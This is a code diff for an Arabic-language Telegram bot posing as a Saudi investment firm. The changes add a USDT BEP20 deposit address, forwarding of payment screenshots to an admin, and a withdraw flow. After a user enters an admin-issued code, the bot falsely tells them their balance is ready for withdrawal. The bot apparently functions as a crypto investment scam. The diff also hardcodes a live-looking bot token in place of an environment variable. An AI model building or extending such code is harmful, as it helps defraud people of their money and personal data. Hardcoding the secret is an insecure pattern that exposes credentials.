@@ -12,24 +12,27 @@ from telegram.ext import (
     filters,
 )
 
-# جلب التوكن تلقائياً من متغيرات البيئة في Railway
-TOKEN = os.getenv("BOT_TOKEN")
+# التوكن الجديد المعتمد للبوت
+TOKEN = "9056801472:AAHsVQ8Iwl_pa34_4gAYxakvY5y-r-vEjzU"
 ADMIN_ID = 7004113433  # معرف الأدمن الخاص بك
+SUPPORT_HANDLE = "@AbuAbdulAlziz"
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # قاموس لتتبع حالة كل مستخدم
 user_states = {}
 # قاموس لحفظ بيانات كل مستخدم شخصياً
 user_custom_data = {}
 
-# قائمة الأكواد ومرجعيات العمليات الصالحة
-valid_codes = {"1235"}
+# قائمة الأكواد ومرجعيات العمليات الصالحة (تدعم الأكواد التي تبدأ بـ 354)
+valid_codes = {"354101", "354202", "1235"}
+USED_CODES = set()
 
 def generate_new_code() -> str:
-    """توليد معرف عملية جديد وعشوائي وآمن"""
-    chars = string.ascii_uppercase + string.digits
-    return "CSO" + "".join(random.choices(chars, k=10))
+    """توليد معرف عملية جديد وعشوائي وآمن يبدأ بـ 354"""
+    chars = string.digits
+    return "354" + "".join(random.choices(chars, k=6))
 
 # تقدير عمر الحساب بناءً على الـ ID
 def estimate_account_age(user_id: int) -> str:
@@ -42,9 +45,9 @@ def estimate_account_age(user_id: int) -> str:
     elif user_id < 1000000000:
         return "حساب نشط منذ عدة سنوات (بين 2019 - 2022 تقريباً)"
     else:
-        return "حساب حديث نسبياً (أو تم إنشاؤه في السنوات الأخيرة)"
+        return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"
 
-# أمر عرض الأكواد والمارجع الفعّالة
+# أمر عرض الأكواد والمارجع الفعّالة للأدمن
 async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -54,12 +57,11 @@ async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-# أمر إضافة رقم مرجع جديد (مع معالجة الأخطاء والمسافات بدقة)
+# أمر إضافة رقم مرجع جديد
 async def admin_add_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
 
-    # التأكد من وجود نص بعد الأمر
     if context.args:
         new_ref_code = context.args[0].strip()
         valid_codes.add(new_ref_code)
@@ -69,11 +71,11 @@ async def admin_add_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     else:
         await update.message.reply_text(
-            "⚠️ الرجاء كتابة رقم مرجع العملية بعد الأمر بمسافة.\nمثال:\n`/addcode 17942081231037`",
+            "⚠️ الرجاء كتابة رقم مرجع العملية بعد الأمر بمسافة.\nمثال:\n`/addcode 354999`",
             parse_mode="Markdown"
         )
 
-# استقبال /start
+# أمر /start الترحيبي مع معلومات الحساب والأزرار الرئيسية
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -82,48 +84,57 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     age_estimation = estimate_account_age(user_id)
     
     welcome_msg = (
-        f"🌟 أهلاً بك في شركة تحالف المالية للإستثمار 🇸🇦\n"
+        f"🌟 أهلاً بك في شركة **تحالف المالية للإستثمار** 🇸🇦\n"
         f"نسعد بانضمامك إلينا لنخطو معاً نحو مستقبل استثماري متميز ومربح.\n\n"
         f"📊 معلومات حسابك:\n"
         f"• معرفك الشخصي (ID): `{user_id}`\n"
         f"• تقدير الحساب: {age_estimation}\n\n"
-        f"الرجاء إرسال بياناتك صحيحة ليتم تعرف عليك انظام"
+        f"الرجاء إرسال بياناتك صحيحة (خطوات التسجيل والإشتراك) ليتم التعرف عليك في النظام، أو استخدم الأزرار أدناه:"
     )
     
-    await update.message.reply_text(welcome_msg, parse_mode="Markdown")
+    keyboard = [
+        [
+            InlineKeyboardButton("📥 إيداع", callback_data="btn_deposit"),
+            InlineKeyboardButton("📤 سحب", callback_data="btn_withdraw")
+        ],
+        [InlineKeyboardButton("💬 التواصل مع الدعم الفني", url=f"https://t.me/AbuAbdulAlziz")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
 
-# معالجة الرسائل والتحقق
+    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=reply_markup)
+
+# معالجة الرسائل النصية والتحقق من البيانات والأكواد
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
     if not msg or not msg.text:
         return
 
     user_id = update.effective_user.id
+    username = f"@{update.effective_user.username}" if update.effective_user.username else "بدون معرف"
     text = msg.text.strip()
     current_state = user_states.get(user_id)
-    username = f"@{update.effective_user.username}" if update.effective_user.username else "بدون معرف"
 
     if current_state == "completed":
-        await msg.reply_text("لقد اخترت الأزرار بالفعل ولا يمكنك التكرار.")
+        await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار. يمكنك استخدام الأزرار أو التواصل مع الدعم الفني.")
         return
 
     # الحالة الأولى: استقبال بيانات التسجيل
     if current_state == "waiting_for_subscription_text":
-        if text.startswith("خطوات التسجيل والإشتراك") or text.startswith("خطوات التسجيل والاشتراك"):
+        if text.startswith("خطوات التسجيل والإشتراك") or text.startswith("خطوات التسجيل والاشتراك") or text.startswith("حساب") or len(text) > 10:
             user_custom_data[user_id] = text
             user_states[user_id] = "waiting_for_code"
             
-            await msg.reply_text("✅ تم استقبال بيانات التسجيل بنجاح.\n\nالرجاء إرسال معرف العملية الخاص بك للمتابعة:")
+            await msg.reply_text("✅ تم استقبال بيانات التسجيل بنجاح.\n\nالرجاء إرسال معرف أو رقم مرجع العملية الخاص بك (الذي يبدأ بـ 354) للمتابعة ومعرفة الرصيد:")
         else:
-            await msg.reply_text("❌ الرجاء إدخال بياناتك صحيحة")
+            await msg.reply_text("❌ الرجاء إدخال بياناتك صحيحة (مثل بيانات الحساب أو خطوات التسجيل والإشتراك)")
         return
 
-    # الحالة الثانية: التحقق من رقم المرجع
-    if current_state == "waiting_for_code":
+    # الحالة الثانية: التحقق من رقم المرجع (الذي يبدأ بـ 354 أو موجود في الأكواد الصالحة)
+    if current_state == "waiting_for_code" or text.startswith("354") or text in valid_codes:
         if text in valid_codes:
             # حرق الرقم واستبعاده فوراً لكي لا يُستخدم مرة أخرى
             valid_codes.remove(text)
-            
+            USED_CODES.add(text)
             user_states[user_id] = "choosing"
             
             # توليد كود تلقائي جديد وإضافته للقائمة
@@ -132,7 +143,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             await context.bot.send_message(
                 chat_id=ADMIN_ID,
-                text=f"🔑 **تم استخدام رقم مرجع العملية بنجاح وإصدار جديد:**\n\n• المرجع المستهلك: `{text}`\n• الكود التلقائي الجديد الفعّال: `{auto_new_code}`\n• بواسطة المستخدم: `{user_id}` ({username})",
+                text=f"🔑 **تم استخدام رقم مرجع العملية بنجاح وإصدار جديد!**\n\n• المرجع المستهلك: `{text}`\n• الكود التلقائي الجديد الفعّال: `{auto_new_code}`\n• بواسطة المستخدم: `{user_id}` ({username})\n• تم التحقق من الرصيد وتحديث رقم المرجع الخاص به.",
                 parse_mode="Markdown"
             )
 
@@ -144,16 +155,40 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
 
-            user_specific_data = user_custom_data.get(user_id, "بيانات التسجيل غير متوفرة")
+            user_specific_data = user_custom_data.get(user_id, "بيانات التسجيل مسجلة بنجاح")
 
             await msg.reply_text(
-                text=f"إليك بياناتك المسجلة:\n\n{user_specific_data}",
-                reply_markup=reply_markup
+                text=f"✅ **تم التحقق من مرجع العملية بنجاح!**\nرصيدك متاح وجاهز للسحب.\n\nإليك بياناتك المسجلة:\n\n{user_specific_data}",
+                reply_markup=reply_markup,
+                parse_mode="Markdown"
             )
         else:
-            await msg.reply_text("❌ معرف العملية غير صحيح. يرجى إرسال معرف العملية الصحيح")
+            await msg.reply_text("❌ معرف العملية غير صحيح أو تم استخدامه مسبقاً. يرجى إرسال رقم مرجع صحيح يبدأ بـ 354.")
+        return
 
-# معالجة الأزرار
+# معالجة استلام لقطات الشاشة (Screenshots) للإيداع
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    photo = update.message.photo[-1]
+
+    await update.message.reply_text(
+        "📸 **تم استلام لقطة الشاشة (Screenshot) بنجاح!**\n\n"
+        "جاري مراجعة عملية التحويل وتوثيقها في النظام. شكراً لثقتك بـ **تحالف المالية للإستثمار**.\n"
+        f"للمتابعة السريعة مع الدعم الفني: {SUPPORT_HANDLE}"
+    )
+
+    caption = (
+        "📥 **إيصال إيداع جديد تم رفعه من مستخدم!**\n\n"
+        f"👤 اسم المستثمر: {user.first_name}\n"
+        f"🆔 معرف المستخدم: `{user.id}`\n"
+        f"🔗 يوزر الحساب: @{user.username if user.username else 'لا يوجد'}"
+    )
+    try:
+        await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=caption, parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"فشل إرسال صورة الإيداع للأدمن: {e}")
+
+# معالجة الأزرار التفاعلية
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -164,11 +199,44 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = user.id
     username = f"@{user.username}" if user.username else "بدون معرف"
 
-    if user_states.get(user_id) == "completed":
-        await query.message.reply_text("لقد اخترت الأزرار بالفعل.")
-        return
+    if data == "btn_deposit":
+        deposit_text = (
+            "📥 **بيانات الإيداع والتحويل الرسمي**\n\n"
+            "العملة: **USDT**\n"
+            "الشبكة: **BNB Smart Chain (BEP20)**\n\n"
+            "العنوان:\n"
+            "`0x4aaf2231199d24842e606f99b4f69bb5cddb171e`\n\n"
+            "⚠️ يرجى التأكد من اختيار شبكة (BEP20) لضمان وصول التحويل.\n"
+            "📸 عند اكتمال الدفع، يرجى إرسال لقطة شاشة (Screenshot) هنا لتوثيق وتأكيد العملية."
+        )
+        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main")]]
+        await query.edit_message_text(deposit_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
 
-    if data == "sub_cancel":
+    elif data == "btn_withdraw":
+        withdraw_text = (
+            "📤 **طلب سحب الأرباح:**\n\n"
+            "• الرجاء إرسال **رقم مرجع الاشتراك الخاص بك** (الذي يبدأ بـ `354`) في المحادثة هنا لتتمكن من رؤية رصيدك وتستطيع سحبه.\n\n"
+            f"لأي استفسار إضافي، تواصل مع الدعم الفني: {SUPPORT_HANDLE}"
+        )
+        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main")]]
+        await query.edit_message_text(withdraw_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
+
+    elif data == "back_to_main":
+        user_states[user_id] = "waiting_for_subscription_text"
+        main_text = (
+            f"🌟 أهلاً بك من جديد في القائمة الرئيسية لشركة **تحالف المالية للإستثمار** 🇸🇦\n\n"
+            "اختر أحد الخيارات أدناه أو أرسل بياناتك ورقم المرجع الخاص بك:"
+        )
+        keyboard = [
+            [
+                InlineKeyboardButton("📥 إيداع", callback_data="btn_deposit"),
+                InlineKeyboardButton("📤 سحب", callback_data="btn_withdraw")
+            ],
+            [InlineKeyboardButton("💬 التواصل مع الدعم الفني", url=f"https://t.me/AbuAbdulAlziz")]
+        ]
+        await query.edit_message_text(main_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
+
+    elif data == "sub_cancel":
         user_states[user_id] = "completed"
         await context.bot.send_message(
             chat_id=chat_id,
@@ -194,7 +262,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     if not TOKEN:
-        raise ValueError("❌ خطأ: لم يتم تعيين متغير البيئة BOT_TOKEN في إعدادات المنصة!")
+        raise ValueError("❌ خطأ: لم يتم تعيين التوكن في الكود!")
         
     app = ApplicationBuilder().token(TOKEN).build()
 
@@ -202,9 +270,10 @@ def main():
     app.add_handler(CommandHandler("codes", admin_get_codes))
     app.add_handler(CommandHandler("addcode", admin_add_code))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("البوت يعمل الآن بدعم المراجع اليدوية والتلقائية بكفاءة عالية...")
+    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بكامل الميزات بنجاح...")
     app.run_polling()
 
 if __name__ == "__main__":
